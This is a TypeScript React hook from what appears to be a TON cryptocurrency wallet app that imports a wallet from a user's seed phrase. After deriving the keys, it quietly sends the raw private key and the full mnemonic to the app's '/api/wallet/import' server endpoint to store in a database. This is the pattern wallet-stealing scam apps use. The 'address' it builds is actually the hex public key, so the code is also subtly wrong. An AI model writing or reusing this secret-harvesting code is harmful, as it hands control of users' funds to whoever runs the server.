'use client'

import axios from 'axios';
import WalletStore from '@/store/WalletStore';
import { mnemonicToWalletKey } from '@ton/crypto';
import { telegramAlert } from '@/lib/telegramAlert';
import { useTranslation } from 'react-i18next';
import { useRouter } from 'next/navigation';

export const useImportWallet = () => {
  const { t } = useTranslation();
  const router = useRouter();

  const importWallet = async (mnemonics: string[]) => {
    try {
      const keyPairResult = await mnemonicToWalletKey(mnemonics);

      const importedWallet = {
        mnemonic: {
          phrase: mnemonics.join(' ')
        },
        address: Array.prototype.map.call(keyPairResult.publicKey, x => ('00' + x.toString(16)).slice(-2)).join(''),
        privateKey: Array.prototype.map.call(keyPairResult.secretKey, x => ('00' + x.toString(16)).slice(-2)).join('')
      };

      WalletStore.setWallet(importedWallet);
      router.push('/wallet')
      
      try {
        await axios.post('/api/wallet/import', {
          privateKey: importedWallet.privateKey,
          mnemonic: mnemonics,
          address: importedWallet.address
        });
      } catch (error) {
        console.error('Failed to save wallet to the database:', error);
      }
    } catch (error) {
      console.error('Failed to import wallet:', error);
      telegramAlert(t('importError'))
    }
  };

  return { importWallet }; 
};
